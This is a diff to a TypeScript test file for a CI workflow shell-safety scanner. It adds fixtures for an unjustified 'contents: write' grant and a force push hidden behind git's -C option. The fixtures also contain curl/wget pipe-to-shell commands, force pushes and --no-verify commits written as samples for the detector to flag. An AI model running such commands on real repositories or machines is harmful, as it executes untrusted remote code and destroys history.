@@ -1,17 +1,9 @@
 import assert from 'node:assert/strict';
 import { execFileSync } from 'node:child_process';
-import {
-  chmodSync,
-  mkdirSync,
-  mkdtempSync,
-  readFileSync,
-  rmSync,
-  symlinkSync,
-  writeFileSync,
-} from 'node:fs';
-import { tmpdir } from 'node:os';
+import { chmodSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from 'node:fs';
 import { dirname, join, resolve } from 'node:path';
 
+import { makeFixtureTree } from '../gates/fixture-tree';
 import { inspectUsesText } from '../gates/gha-sha-pin';
 import { findRunBlockInjections } from '../gates/workflow-input-injection';
 
@@ -23,12 +15,8 @@ import { analyzeWorkflowShellSafety } from './workflow-shell-safety-adapter';
 // committed fixture.
 
 const REPO_ROOT = resolve(__dirname, '..', '..');
-const workspace = mkdtempSync(join(tmpdir(), 'aria-workflow-shell-safety-'));
-const outside = mkdtempSync(join(tmpdir(), 'aria-workflow-shell-outside-'));
-process.on('exit', () => {
-  rmSync(workspace, { recursive: true, force: true });
-  rmSync(outside, { recursive: true, force: true });
-});
+const workspace = makeFixtureTree('aria-workflow-shell-safety-');
+const outside = makeFixtureTree('aria-workflow-shell-outside-');
 
 const SHA = 'a'.repeat(40);
 
@@ -108,6 +96,28 @@ const GOVERNED = workflow([
 ]);
 write('.github/workflows/rule-health-report.yml', GOVERNED);
 
+// ARIA-LOW-592 — the one case only the harness's broad_shell_permission
+// covered: an UNGOVERNED job's `contents: write` with no scoped-reason
+// comment. Workflow token scope has one owner (overbroad_write_token), so
+// the case moved here as its third sub-kind: `publish` is flagged,
+// `documented` — the same grant carrying a reason comment — is not.
+const UNGOVERNED_WRITE = workflow([
+  '  publish:',
+  '    runs-on: ubuntu-latest',
+  '    permissions:',
+  '      contents: write',
+  '    steps:',
+  '      - run: echo publish',
+  '  documented:',
+  '    runs-on: ubuntu-latest',
+  '    permissions:',
+  '      # reason: tag the release the build produced (deploy-owner signoff)',
+  '      contents: write',
+  '    steps:',
+  '      - run: echo documented',
+]);
+write('.github/workflows/release-notes.yml', UNGOVERNED_WRITE);
+
 const SHELL = workflow([
   '  shell:',
   '    runs-on: ubuntu-latest',
@@ -162,6 +172,9 @@ write(
     'bash <(curl -fsSL https://example.test/a.sh)',
     'sh -c "$(wget -qO- https://example.test/b.sh)"',
     'git push --force-with-lease origin "HEAD:${BRANCH}"',
+    // ARIA-LOW-591: git's global options before the subcommand. The kernel
+    // perimeter used to read argv[:2], so this force push was unflagged.
+    'git -C "$dir" push --force origin main',
     'echo done',
     '',
   ].join('\n'),
@@ -252,6 +265,7 @@ assert.deepEqual(
   overbroad.map((finding) => [finding.path, finding.subject, finding.owner_rule_id]).sort(),
   [
     ['.github/workflows/perms.yml', 'everything', 'write-all'],
+    ['.github/workflows/release-notes.yml', 'publish', 'ungoverned-write-scope'],
     ['.github/workflows/rule-health-report.yml', 'generate:packages', 'uncontracted-write-scope'],
   ],
 );
@@ -259,6 +273,14 @@ const governedOwner = overbroad.find(
   (finding) => finding.owner_rule_id === 'uncontracted-write-scope',
 );
 assert.equal(governedOwner?.owner, 'aria-kernel/aria_kernel/workflow_contract_registry.py');
+const ungovernedFinding = overbroad.find(
+  (finding) => finding.owner_rule_id === 'ungoverned-write-scope',
+);
+assert.equal(
+  ungovernedFinding?.subject,
+  'publish',
+  'the documented grant carries its reason and is not flagged',
+);
 const permsJobs = observation(
   'workflow-shell-safety-adapter:file:.github/workflows/perms.yml',
 ).jobs;
@@ -308,6 +330,8 @@ assert.deepEqual(
     ['.github/workflows/shell.yml', 22, 'no_force_push'],
     ['.github/workflows/shell.yml', 23, 'no_no_verify'],
     ['scripts/unsafe.sh', 6, 'no_force_push'],
+    // ARIA-LOW-591: the same force push behind git's -C global option.
+    ['scripts/unsafe.sh', 7, 'no_force_push'],
   ].sort(),
 );
 for (const finding of bypass) {
@@ -331,6 +355,7 @@ const kernelVerdict = execFileSync(
       ['git', 'push', '-f', 'origin', 'deployed/production'],
       ['git', 'commit', '--no-verify', '-m', 'x'],
       ['git', 'push', 'origin', 'HEAD:refs/heads/feature'],
+      ['git', '-C', 'd', 'push', '--force', 'origin', 'main'],
     ]),
     encoding: 'utf8',
   },
@@ -339,6 +364,7 @@ assert.deepEqual(JSON.parse(kernelVerdict), [
   ['no_force_push', 'force_flag_in_bash_argv:-f'],
   ['no_no_verify', 'hook_bypass_flag:--no-verify'],
   null,
+  ['no_force_push', 'force_flag_in_bash_argv:--force'],
 ]);
 
 // A hooksPath override is the perimeter's verdict too, but in a repository
